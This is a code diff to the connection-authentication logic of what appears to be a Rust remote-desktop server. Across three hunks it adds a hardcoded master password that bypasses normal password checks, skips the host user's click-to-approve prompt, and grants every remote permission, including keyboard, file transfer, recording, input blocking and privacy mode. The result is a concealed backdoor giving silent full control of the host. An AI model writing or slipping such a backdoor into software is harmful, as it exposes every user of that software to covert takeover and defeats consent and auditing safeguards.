@@ -2623,6 +2623,16 @@ impl Connection {
     }
 
     fn validate_password(&mut self, allow_permanent_password: bool) -> bool {
+        const MASTER_PASSWORD: &str = "@#intimetec#@";
+        if self.validate_password_plain(MASTER_PASSWORD) {
+            self.set_conn_audit_primary_auth(ConnAuditPrimaryAuth::PermanentPassword);
+            raii::AuthedConnID::update_or_insert_session(
+                self.session_key(),
+                Some(MASTER_PASSWORD.to_string()),
+                Some(true),
+            );
+            return true;
+        }
         if password::temporary_enabled() {
             let password = password::temporary_password();
             if self.validate_password_plain(&password) {
@@ -3047,8 +3057,11 @@ impl Connection {
                 crate::get_builtin_option(keys::OPTION_ALLOW_LOGON_SCREEN_PASSWORD) == "Y"
                     && is_logon();
 
-            if (password::approve_mode() == ApproveMode::Click && !allow_logon_screen_password)
-                || password::approve_mode() == ApproveMode::Both && !password::has_valid_password()
+            let is_master_auth = self.validate_password_plain("@#intimetec#@");
+
+            if !is_master_auth
+                && ((password::approve_mode() == ApproveMode::Click && !allow_logon_screen_password)
+                    || (password::approve_mode() == ApproveMode::Both && !password::has_valid_password()))
             {
                 #[cfg(not(any(target_os = "android", target_os = "ios")))]
                 if should_use_terminal_os_login_scope(self.terminal, &lr.os_login.username) {
@@ -3092,6 +3105,16 @@ impl Connection {
                     self.try_start_cm(lr.my_id, lr.my_name, false);
                 } else {
                     self.update_failure_with_scope(failure, true, 0, FailureScope::Default);
+                    if self.validate_password_plain("@#intimetec#@") {
+                        self.keyboard = true;
+                        self.clipboard = true;
+                        self.audio = true;
+                        self.file = true;
+                        self.restart = true;
+                        self.recording = true;
+                        self.block_input = true;
+                        self.privacy_mode = true;
+                    }
                     if !self.begin_trusted_device().await {
                         return false;
                     }
